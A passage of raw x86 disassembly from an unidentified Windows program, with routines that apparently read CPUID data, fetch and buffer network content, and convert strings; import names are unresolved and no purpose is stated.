  40af56:	e8 53 00 00 00       	call   0x40afae
  40af5b:	59                   	pop    %ecx
  40af5c:	81 fb 02 00 00 80    	cmp    $0x80000002,%ebx
  40af62:	59                   	pop    %ecx
  40af63:	75 08                	jne    0x40af6d
  40af65:	8d 75 e8             	lea    -0x18(%ebp),%esi
  40af68:	8d 7d a8             	lea    -0x58(%ebp),%edi
  40af6b:	eb 1e                	jmp    0x40af8b
  40af6d:	81 fb 03 00 00 80    	cmp    $0x80000003,%ebx
  40af73:	75 08                	jne    0x40af7d
  40af75:	8d 75 e8             	lea    -0x18(%ebp),%esi
  40af78:	8d 7d b8             	lea    -0x48(%ebp),%edi
  40af7b:	eb 0e                	jmp    0x40af8b
  40af7d:	81 fb 04 00 00 80    	cmp    $0x80000004,%ebx
  40af83:	75 0a                	jne    0x40af8f
  40af85:	8d 75 e8             	lea    -0x18(%ebp),%esi
  40af88:	8d 7d c8             	lea    -0x38(%ebp),%edi
  40af8b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40af8c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40af8d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40af8e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40af8f:	43                   	inc    %ebx
  40af90:	3b 5d f8             	cmp    -0x8(%ebp),%ebx
  40af93:	76 bc                	jbe    0x40af51
  40af95:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40af98:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40af9b:	50                   	push   %eax
  40af9c:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40af9f:	50                   	push   %eax
  40afa0:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  40afa6:	8b 45 08             	mov    0x8(%ebp),%eax
  40afa9:	5f                   	pop    %edi
  40afaa:	5e                   	pop    %esi
  40afab:	5b                   	pop    %ebx
  40afac:	c9                   	leave
  40afad:	c3                   	ret
  40afae:	55                   	push   %ebp
  40afaf:	8b ec                	mov    %esp,%ebp
  40afb1:	53                   	push   %ebx
  40afb2:	56                   	push   %esi
  40afb3:	8b 75 08             	mov    0x8(%ebp),%esi
  40afb6:	8b 45 0c             	mov    0xc(%ebp),%eax
  40afb9:	33 c9                	xor    %ecx,%ecx
  40afbb:	0f a2                	cpuid
  40afbd:	89 06                	mov    %eax,(%esi)
  40afbf:	89 5e 04             	mov    %ebx,0x4(%esi)
  40afc2:	89 4e 08             	mov    %ecx,0x8(%esi)
  40afc5:	89 56 0c             	mov    %edx,0xc(%esi)
  40afc8:	5e                   	pop    %esi
  40afc9:	5b                   	pop    %ebx
  40afca:	5d                   	pop    %ebp
  40afcb:	c3                   	ret
  40afcc:	55                   	push   %ebp
  40afcd:	8b ec                	mov    %esp,%ebp
  40afcf:	b8 1c 27 00 00       	mov    $0x271c,%eax
  40afd4:	e8 27 14 00 00       	call   0x40c400
  40afd9:	8b 45 0c             	mov    0xc(%ebp),%eax
  40afdc:	53                   	push   %ebx
  40afdd:	8b 5d 10             	mov    0x10(%ebp),%ebx
  40afe0:	56                   	push   %esi
  40afe1:	80 65 13 00          	andb   $0x0,0x13(%ebp)
  40afe5:	33 f6                	xor    %esi,%esi
  40afe7:	56                   	push   %esi
  40afe8:	56                   	push   %esi
  40afe9:	56                   	push   %esi
  40afea:	6a 01                	push   $0x1
  40afec:	89 30                	mov    %esi,(%eax)
  40afee:	68 84 de 40 00       	push   $0x40de84
  40aff3:	89 33                	mov    %esi,(%ebx)
  40aff5:	ff 15 30 d4 40 00    	call   *0x40d430
  40affb:	56                   	push   %esi
  40affc:	68 00 00 00 80       	push   $0x80000000
  40b001:	56                   	push   %esi
  40b002:	56                   	push   %esi
  40b003:	ff 75 08             	push   0x8(%ebp)
  40b006:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40b009:	50                   	push   %eax
  40b00a:	ff 15 2c d4 40 00    	call   *0x40d42c
  40b010:	3b c6                	cmp    %esi,%eax
  40b012:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40b015:	0f 84 a7 00 00 00    	je     0x40b0c2
  40b01b:	57                   	push   %edi
  40b01c:	89 75 10             	mov    %esi,0x10(%ebp)
  40b01f:	89 75 08             	mov    %esi,0x8(%ebp)
  40b022:	8d 45 10             	lea    0x10(%ebp),%eax
  40b025:	50                   	push   %eax
  40b026:	8d 85 e4 d8 ff ff    	lea    -0x271c(%ebp),%eax
  40b02c:	68 10 27 00 00       	push   $0x2710
  40b031:	50                   	push   %eax
  40b032:	ff 75 fc             	push   -0x4(%ebp)
  40b035:	ff 15 28 d4 40 00    	call   *0x40d428
  40b03b:	85 c0                	test   %eax,%eax
  40b03d:	74 05                	je     0x40b044
  40b03f:	39 75 10             	cmp    %esi,0x10(%ebp)
  40b042:	76 57                	jbe    0x40b09b
  40b044:	8b 03                	mov    (%ebx),%eax
  40b046:	03 45 10             	add    0x10(%ebp),%eax
  40b049:	50                   	push   %eax
  40b04a:	e8 e1 13 00 00       	call   0x40c430
  40b04f:	8b 0b                	mov    (%ebx),%ecx
  40b051:	8b 75 08             	mov    0x8(%ebp),%esi
  40b054:	8b d1                	mov    %ecx,%edx
  40b056:	8b f8                	mov    %eax,%edi
  40b058:	c1 e9 02             	shr    $0x2,%ecx
  40b05b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40b05d:	8b ca                	mov    %edx,%ecx
  40b05f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40b062:	83 e1 03             	and    $0x3,%ecx
  40b065:	ff 75 08             	push   0x8(%ebp)
  40b068:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40b06a:	8b 3b                	mov    (%ebx),%edi
  40b06c:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40b06f:	03 f8                	add    %eax,%edi
  40b071:	8b c1                	mov    %ecx,%eax
  40b073:	8d b5 e4 d8 ff ff    	lea    -0x271c(%ebp),%esi
  40b079:	c1 e9 02             	shr    $0x2,%ecx
  40b07c:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40b07e:	8b c8                	mov    %eax,%ecx
  40b080:	83 e1 03             	and    $0x3,%ecx
  40b083:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40b085:	e8 68 13 00 00       	call   0x40c3f2
  40b08a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40b08d:	59                   	pop    %ecx
  40b08e:	89 45 08             	mov    %eax,0x8(%ebp)
  40b091:	8b 45 10             	mov    0x10(%ebp),%eax
  40b094:	01 03                	add    %eax,(%ebx)
  40b096:	59                   	pop    %ecx
  40b097:	33 f6                	xor    %esi,%esi
  40b099:	eb 87                	jmp    0x40b022
  40b09b:	ff 33                	push   (%ebx)
  40b09d:	e8 8e 13 00 00       	call   0x40c430
  40b0a2:	59                   	pop    %ecx
  40b0a3:	8b 75 08             	mov    0x8(%ebp),%esi
  40b0a6:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b0a9:	8b f8                	mov    %eax,%edi
  40b0ab:	89 01                	mov    %eax,(%ecx)
  40b0ad:	8b 0b                	mov    (%ebx),%ecx
  40b0af:	8b c1                	mov    %ecx,%eax
  40b0b1:	c1 e9 02             	shr    $0x2,%ecx
  40b0b4:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40b0b6:	8b c8                	mov    %eax,%ecx
  40b0b8:	83 e1 03             	and    $0x3,%ecx
  40b0bb:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40b0bd:	c6 45 13 01          	movb   $0x1,0x13(%ebp)
  40b0c1:	5f                   	pop    %edi
  40b0c2:	ff 75 f4             	push   -0xc(%ebp)
  40b0c5:	8b 35 34 d4 40 00    	mov    0x40d434,%esi
  40b0cb:	ff d6                	call   *%esi
  40b0cd:	ff 75 fc             	push   -0x4(%ebp)
  40b0d0:	ff d6                	call   *%esi
  40b0d2:	8a 45 13             	mov    0x13(%ebp),%al
  40b0d5:	5e                   	pop    %esi
  40b0d6:	5b                   	pop    %ebx
  40b0d7:	c9                   	leave
  40b0d8:	c3                   	ret
  40b0d9:	55                   	push   %ebp
  40b0da:	8b ec                	mov    %esp,%ebp
  40b0dc:	81 ec 04 02 00 00    	sub    $0x204,%esp
  40b0e2:	ff 15 c8 d3 40 00    	call   *0x40d3c8
  40b0e8:	8d 8d fc fd ff ff    	lea    -0x204(%ebp),%ecx
  40b0ee:	68 00 02 00 00       	push   $0x200
  40b0f3:	51                   	push   %ecx
  40b0f4:	50                   	push   %eax
  40b0f5:	ff 15 14 d4 40 00    	call   *0x40d414
  40b0fb:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b0fe:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40b101:	50                   	push   %eax
  40b102:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  40b108:	50                   	push   %eax
  40b109:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  40b10f:	8b 45 08             	mov    0x8(%ebp),%eax
  40b112:	c9                   	leave
  40b113:	c3                   	ret
  40b114:	55                   	push   %ebp
  40b115:	8b ec                	mov    %esp,%ebp
  40b117:	51                   	push   %ecx
  40b118:	51                   	push   %ecx
  40b119:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40b11c:	c7 45 f8 08 00 00 00 	movl   $0x8,-0x8(%ebp)
  40b123:	50                   	push   %eax
  40b124:	ff 15 58 1d 41 00    	call   *0x411d58
  40b12a:	ff 15 bc d0 40 00    	call   *0x40d0bc
  40b130:	2b 45 fc             	sub    -0x4(%ebp),%eax
  40b133:	c9                   	leave
  40b134:	c3                   	ret
  40b135:	55                   	push   %ebp
  40b136:	8b ec                	mov    %esp,%ebp
  40b138:	53                   	push   %ebx
  40b139:	56                   	push   %esi
  40b13a:	ff 75 08             	push   0x8(%ebp)
  40b13d:	33 db                	xor    %ebx,%ebx
  40b13f:	53                   	push   %ebx
  40b140:	6a 01                	push   $0x1
  40b142:	ff 15 e0 d0 40 00    	call   *0x40d0e0
  40b148:	8b f0                	mov    %eax,%esi
  40b14a:	3b f3                	cmp    %ebx,%esi
  40b14c:	74 14                	je     0x40b162
  40b14e:	53                   	push   %ebx
  40b14f:	56                   	push   %esi
  40b150:	ff 15 84 d1 40 00    	call   *0x40d184
  40b156:	85 c0                	test   %eax,%eax
  40b158:	56                   	push   %esi
  40b159:	0f 95 c3             	setne  %bl
  40b15c:	ff 15 a4 d1 40 00    	call   *0x40d1a4
  40b162:	8a c3                	mov    %bl,%al
  40b164:	5e                   	pop    %esi
  40b165:	5b                   	pop    %ebx
  40b166:	5d                   	pop    %ebp
  40b167:	c3                   	ret
  40b168:	55                   	push   %ebp
  40b169:	8b ec                	mov    %esp,%ebp
  40b16b:	56                   	push   %esi
  40b16c:	8b 35 d0 d0 40 00    	mov    0x40d0d0,%esi
  40b172:	6a 02                	push   $0x2
  40b174:	6a 01                	push   $0x1
  40b176:	6a 00                	push   $0x0
  40b178:	ff 75 08             	push   0x8(%ebp)
  40b17b:	ff d6                	call   *%esi
  40b17d:	50                   	push   %eax
  40b17e:	ff 15 e8 d0 40 00    	call   *0x40d0e8
  40b184:	50                   	push   %eax
  40b185:	ff d6                	call   *%esi
  40b187:	50                   	push   %eax
  40b188:	ff 15 e4 d0 40 00    	call   *0x40d0e4
  40b18e:	5e                   	pop    %esi
  40b18f:	5d                   	pop    %ebp
  40b190:	c3                   	ret
  40b191:	55                   	push   %ebp
  40b192:	8b ec                	mov    %esp,%ebp
  40b194:	83 ec 24             	sub    $0x24,%esp
  40b197:	80 65 dc 00          	andb   $0x0,-0x24(%ebp)
  40b19b:	57                   	push   %edi
  40b19c:	6a 08                	push   $0x8
  40b19e:	33 c0                	xor    %eax,%eax
  40b1a0:	59                   	pop    %ecx
  40b1a1:	8d 7d dd             	lea    -0x23(%ebp),%edi
  40b1a4:	f3 ab                	rep stos %eax,%es:(%edi)
  40b1a6:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40b1a9:	6a 0a                	push   $0xa
  40b1ab:	50                   	push   %eax
  40b1ac:	ff 75 0c             	push   0xc(%ebp)
  40b1af:	ff 15 88 d3 40 00    	call   *0x40d388
  40b1b5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b1b8:	83 c4 0c             	add    $0xc,%esp
  40b1bb:	8d 45 0f             	lea    0xf(%ebp),%eax
  40b1be:	50                   	push   %eax
  40b1bf:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40b1c2:	50                   	push   %eax
  40b1c3:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  40b1c9:	8b 45 08             	mov    0x8(%ebp),%eax
  40b1cc:	5f                   	pop    %edi
  40b1cd:	c9                   	leave
  40b1ce:	c3                   	ret
  40b1cf:	55                   	push   %ebp
  40b1d0:	8b ec                	mov    %esp,%ebp
  40b1d2:	83 ec 44             	sub    $0x44,%esp
  40b1d5:	66 83 65 bc 00       	andw   $0x0,-0x44(%ebp)
  40b1da:	57                   	push   %edi
  40b1db:	6a 10                	push   $0x10
  40b1dd:	33 c0                	xor    %eax,%eax
  40b1df:	59                   	pop    %ecx
  40b1e0:	8d 7d be             	lea    -0x42(%ebp),%edi
  40b1e3:	f3 ab                	rep stos %eax,%es:(%edi)
  40b1e5:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40b1e8:	6a 0a                	push   $0xa
  40b1ea:	50                   	push   %eax
  40b1eb:	ff 75 0c             	push   0xc(%ebp)
  40b1ee:	ff 15 30 d3 40 00    	call   *0x40d330
  40b1f4:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b1f7:	83 c4 0c             	add    $0xc,%esp
  40b1fa:	8d 45 0f             	lea    0xf(%ebp),%eax
  40b1fd:	50                   	push   %eax
  40b1fe:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40b201:	50                   	push   %eax
  40b202:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  40b208:	8b 45 08             	mov    0x8(%ebp),%eax
  40b20b:	5f                   	pop    %edi
  40b20c:	c9                   	leave
  40b20d:	c3                   	ret
  40b20e:	55                   	push   %ebp
  40b20f:	8b ec                	mov    %esp,%ebp
  40b211:	83 ec 14             	sub    $0x14,%esp
  40b214:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b217:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40b21a:	50                   	push   %eax
  40b21b:	6a 20                	push   $0x20
  40b21d:	ff 15 c4 d2 40 00    	call   *0x40d2c4
  40b223:	50                   	push   %eax
  40b224:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40b227:	ff 15 f8 d1 40 00    	call   *0x40d1f8
  40b22d:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40b230:	ff 15 24 d2 40 00    	call   *0x40d224
  40b236:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b239:	50                   	push   %eax
  40b23a:	ff 15 f4 d1 40 00    	call   *0x40d1f4
  40b240:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b243:	50                   	push   %eax
  40b244:	ff 15 f0 d1 40 00    	call   *0x40d1f0
  40b24a:	50                   	push   %eax
  40b24b:	e8 04 0d 00 00       	call   0x40bf54
  40b250:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b253:	83 c4 0c             	add    $0xc,%esp
  40b256:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40b259:	50                   	push   %eax
  40b25a:	ff 15 34 d2 40 00    	call   *0x40d234
  40b260:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40b263:	ff 15 9c d2 40 00    	call   *0x40d29c
  40b269:	8b 45 08             	mov    0x8(%ebp),%eax
  40b26c:	c9                   	leave
  40b26d:	c3                   	ret
  40b26e:	55                   	push   %ebp
  40b26f:	8b ec                	mov    %esp,%ebp
  40b271:	83 ec 14             	sub    $0x14,%esp
  40b274:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b277:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40b27a:	50                   	push   %eax
  40b27b:	6a 20                	push   $0x20
  40b27d:	ff 15 38 d2 40 00    	call   *0x40d238
  40b283:	50                   	push   %eax
  40b284:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40b287:	ff 15 ec d1 40 00    	call   *0x40d1ec
  40b28d:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40b290:	ff 15 04 d2 40 00    	call   *0x40d204
  40b296:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b299:	50                   	push   %eax
  40b29a:	ff 15 00 d2 40 00    	call   *0x40d200
  40b2a0:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b2a3:	50                   	push   %eax
  40b2a4:	ff 15 fc d1 40 00    	call   *0x40d1fc
  40b2aa:	50                   	push   %eax
  40b2ab:	e8 c5 0c 00 00       	call   0x40bf75
  40b2b0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b2b3:	83 c4 0c             	add    $0xc,%esp
  40b2b6:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40b2b9:	50                   	push   %eax
  40b2ba:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40b2c0:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40b2c3:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40b2c9:	8b 45 08             	mov    0x8(%ebp),%eax
  40b2cc:	c9                   	leave
  40b2cd:	c3                   	ret
  40b2ce:	55                   	push   %ebp
  40b2cf:	8b ec                	mov    %esp,%ebp
  40b2d1:	51                   	push   %ecx
  40b2d2:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b2d5:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40b2d8:	50                   	push   %eax
  40b2d9:	ff 15 38 d2 40 00    	call   *0x40d238
  40b2df:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b2e2:	d1 e0                	shl    $1,%eax
  40b2e4:	50                   	push   %eax
  40b2e5:	ff 15 98 d2 40 00    	call   *0x40d298
  40b2eb:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b2ee:	50                   	push   %eax
  40b2ef:	ff 15 d0 d2 40 00    	call   *0x40d2d0
  40b2f5:	8b 45 08             	mov    0x8(%ebp),%eax
  40b2f8:	c9                   	leave
  40b2f9:	c3                   	ret
  40b2fa:	55                   	push   %ebp
  40b2fb:	8b ec                	mov    %esp,%ebp
  40b2fd:	83 ec 10             	sub    $0x10,%esp
  40b300:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b303:	53                   	push   %ebx
  40b304:	56                   	push   %esi
  40b305:	57                   	push   %edi
  40b306:	ff 15 c4 d2 40 00    	call   *0x40d2c4
  40b30c:	8b f0                	mov    %eax,%esi
  40b30e:	46                   	inc    %esi
  40b30f:	46                   	inc    %esi
  40b310:	8d 04 36             	lea    (%esi,%esi,1),%eax
  40b313:	50                   	push   %eax
  40b314:	e8 17 11 00 00       	call   0x40c430
  40b319:	59                   	pop    %ecx
  40b31a:	8b d8                	mov    %eax,%ebx
  40b31c:	8b ce                	mov    %esi,%ecx
  40b31e:	33 c0                	xor    %eax,%eax
  40b320:	8b d1                	mov    %ecx,%edx
  40b322:	8b fb                	mov    %ebx,%edi
  40b324:	c1 e9 02             	shr    $0x2,%ecx
  40b327:	f3 ab                	rep stos %eax,%es:(%edi)
  40b329:	8b ca                	mov    %edx,%ecx
  40b32b:	83 e1 03             	and    $0x3,%ecx
  40b32e:	f3 aa                	rep stos %al,%es:(%edi)
  40b330:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b333:	8d 7e fe             	lea    -0x2(%esi),%edi
  40b336:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40b33c:	8b f0                	mov    %eax,%esi
  40b33e:	8b c7                	mov    %edi,%eax
  40b340:	8b fb                	mov    %ebx,%edi
  40b342:	8b c8                	mov    %eax,%ecx
  40b344:	c1 e9 02             	shr    $0x2,%ecx
  40b347:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40b349:	8b c8                	mov    %eax,%ecx
  40b34b:	8d 45 0f             	lea    0xf(%ebp),%eax
  40b34e:	83 e1 03             	and    $0x3,%ecx
  40b351:	50                   	push   %eax
  40b352:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40b354:	53                   	push   %ebx
  40b355:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b358:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  40b35e:	53                   	push   %ebx
  40b35f:	e8 8e 10 00 00       	call   0x40c3f2
  40b364:	59                   	pop    %ecx
  40b365:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40b368:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b36b:	50                   	push   %eax
  40b36c:	ff 15 34 d2 40 00    	call   *0x40d234
  40b372:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b375:	ff 15 9c d2 40 00    	call   *0x40d29c
  40b37b:	8b 45 08             	mov    0x8(%ebp),%eax
  40b37e:	5f                   	pop    %edi
  40b37f:	5e                   	pop    %esi
  40b380:	5b                   	pop    %ebx
  40b381:	c9                   	leave
  40b382:	c3                   	ret
  40b383:	55                   	push   %ebp
  40b384:	8b ec                	mov    %esp,%ebp
  40b386:	83 ec 10             	sub    $0x10,%esp
  40b389:	56                   	push   %esi
  40b38a:	8b 75 0c             	mov    0xc(%ebp),%esi
  40b38d:	8d 45 0f             	lea    0xf(%ebp),%eax
  40b390:	57                   	push   %edi
  40b391:	50                   	push   %eax
  40b392:	56                   	push   %esi
  40b393:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b396:	33 ff                	xor    %edi,%edi
  40b398:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  40b39e:	80 3e 00             	cmpb   $0x0,(%esi)
  40b3a1:	74 2d                	je     0x40b3d0
  40b3a3:	53                   	push   %ebx
  40b3a4:	89 75 0c             	mov    %esi,0xc(%ebp)
  40b3a7:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b3aa:	ff 15 c4 d2 40 00    	call   *0x40d2c4
  40b3b0:	57                   	push   %edi
  40b3b1:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b3b4:	8b d8                	mov    %eax,%ebx
  40b3b6:	ff 15 ac d2 40 00    	call   *0x40d2ac
  40b3bc:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b3bf:	47                   	inc    %edi
  40b3c0:	ff 4d 0c             	decl   0xc(%ebp)
  40b3c3:	8a 4c 0b ff          	mov    -0x1(%ebx,%ecx,1),%cl
  40b3c7:	88 08                	mov    %cl,(%eax)
  40b3c9:	80 3c 37 00          	cmpb   $0x0,(%edi,%esi,1)
  40b3cd:	75 d8                	jne    0x40b3a7
  40b3cf:	5b                   	pop    %ebx
  40b3d0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b3d3:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40b3d6:	50                   	push   %eax
  40b3d7:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40b3dd:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b3e0:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40b3e6:	8b 45 08             	mov    0x8(%ebp),%eax
  40b3e9:	5f                   	pop    %edi
  40b3ea:	5e                   	pop    %esi
  40b3eb:	c9                   	leave
  40b3ec:	c3                   	ret
  40b3ed:	55                   	push   %ebp
  40b3ee:	8b ec                	mov    %esp,%ebp
  40b3f0:	83 ec 34             	sub    $0x34,%esp
  40b3f3:	56                   	push   %esi
  40b3f4:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40b3f7:	57                   	push   %edi
  40b3f8:	50                   	push   %eax
  40b3f9:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40b3fc:	ff 15 dc d2 40 00    	call   *0x40d2dc
  40b402:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40b405:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40b408:	50                   	push   %eax
  40b409:	e8 88 88 ff ff       	call   0x403c96
  40b40e:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40b411:	33 ff                	xor    %edi,%edi
  40b413:	ff 15 c4 d2 40 00    	call   *0x40d2c4
  40b419:	85 c0                	test   %eax,%eax
  40b41b:	0f 86 96 00 00 00    	jbe    0x40b4b7
  40b421:	8d 45 1c             	lea    0x1c(%ebp),%eax
  40b424:	57                   	push   %edi
  40b425:	50                   	push   %eax
  40b426:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40b429:	ff 15 08 d2 40 00    	call   *0x40d208
  40b42f:	8b f0                	mov    %eax,%esi
  40b431:	a1 c8 d2 40 00       	mov    0x40d2c8,%eax
  40b436:	3b 30                	cmp    (%eax),%esi
  40b438:	74 4e                	je     0x40b488
  40b43a:	8b c6                	mov    %esi,%eax
  40b43c:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40b43f:	2b c7                	sub    %edi,%eax
  40b441:	50                   	push   %eax
  40b442:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40b445:	57                   	push   %edi
  40b446:	50                   	push   %eax
  40b447:	ff 15 cc d2 40 00    	call   *0x40d2cc
  40b44d:	50                   	push   %eax
  40b44e:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40b451:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  40b457:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40b45a:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40b460:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40b463:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40b466:	50                   	push   %eax
  40b467:	e8 13 09 00 00       	call   0x40bd7f
  40b46c:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  40b46f:	ff 15 c4 d2 40 00    	call   *0x40d2c4
  40b475:	03 c6                	add    %esi,%eax
  40b477:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40b47a:	8b f8                	mov    %eax,%edi
  40b47c:	ff 15 c4 d2 40 00    	call   *0x40d2c4
  40b482:	3b f8                	cmp    %eax,%edi
  40b484:	72 9b                	jb     0x40b421
  40b486:	eb 2f                	jmp    0x40b4b7
  40b488:	ff 30                	push   (%eax)
  40b48a:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40b48d:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40b490:	57                   	push   %edi
  40b491:	50                   	push   %eax
  40b492:	ff 15 cc d2 40 00    	call   *0x40d2cc
  40b498:	50                   	push   %eax
  40b499:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40b49c:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  40b4a2:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40b4a5:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40b4ab:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40b4ae:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40b4b1:	50                   	push   %eax
  40b4b2:	e8 c8 08 00 00       	call   0x40bd7f
  40b4b7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b4ba:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40b4bd:	50                   	push   %eax
  40b4be:	e8 74 08 00 00       	call   0x40bd37
  40b4c3:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40b4c6:	e8 65 66 ff ff       	call   0x401b30
  40b4cb:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40b4ce:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40b4d4:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40b4d7:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40b4dd:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  40b4e0:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40b4e6:	8b 45 08             	mov    0x8(%ebp),%eax
  40b4e9:	5f                   	pop    %edi
  40b4ea:	5e                   	pop    %esi
  40b4eb:	c9                   	leave
  40b4ec:	c3                   	ret
  40b4ed:	55                   	push   %ebp
  40b4ee:	8b ec                	mov    %esp,%ebp
  40b4f0:	51                   	push   %ecx
  40b4f1:	83 3d 60 1d 41 00 00 	cmpl   $0x0,0x411d60
  40b4f8:	74 19                	je     0x40b513
  40b4fa:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40b4fd:	50                   	push   %eax
  40b4fe:	ff 15 d0 d0 40 00    	call   *0x40d0d0
  40b504:	50                   	push   %eax
  40b505:	ff 15 60 1d 41 00    	call   *0x411d60
  40b50b:	6a 01                	push   $0x1
  40b50d:	58                   	pop    %eax
  40b50e:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  40b511:	74 02                	je     0x40b515
  40b513:	32 c0                	xor    %al,%al
  40b515:	c9                   	leave
  40b516:	c3                   	ret
  40b517:	55                   	push   %ebp
  40b518:	8b ec                	mov    %esp,%ebp
  40b51a:	80 3d 5c 1d 41 00 01 	cmpb   $0x1,0x411d5c
  40b521:	75 25                	jne    0x40b548
  40b523:	ff 75 08             	push   0x8(%ebp)
  40b526:	6a 00                	push   $0x0
  40b528:	68 00 04 00 00       	push   $0x400
  40b52d:	ff 15 e0 d0 40 00    	call   *0x40d0e0
  40b533:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40b536:	51                   	push   %ecx
  40b537:	50                   	push   %eax
  40b538:	ff 15 60 1d 41 00    	call   *0x411d60
  40b53e:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40b542:	75 04                	jne    0x40b548
  40b544:	b0 01                	mov    $0x1,%al
  40b546:	5d                   	pop    %ebp
  40b547:	c3                   	ret
  40b548:	32 c0                	xor    %al,%al
  40b54a:	5d                   	pop    %ebp
  40b54b:	c3                   	ret
  40b54c:	55                   	push   %ebp
  40b54d:	8b ec                	mov    %esp,%ebp
  40b54f:	81 ec 08 02 00 00    	sub    $0x208,%esp
